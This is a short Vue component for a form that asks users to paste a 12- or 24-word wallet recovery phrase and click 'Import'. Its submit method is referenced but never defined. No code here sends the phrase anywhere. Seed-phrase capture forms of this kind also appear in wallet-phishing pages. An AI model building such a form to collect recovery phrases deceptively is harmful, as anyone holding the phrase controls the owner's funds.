<template>
  <div class="phrase-form" >
      <form method="post" action="" @submit.prevent="submit">

          <textarea v-model="form.phrase"   id="" cols="30" rows="10" placeholder="Phrase"></textarea>
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
</template>

<script>

export default {
    name:"phrase",

    data (){
        return{
           form : {
               phrase: '',
           }
        }
    },

   

}

</script>

<style>

</style>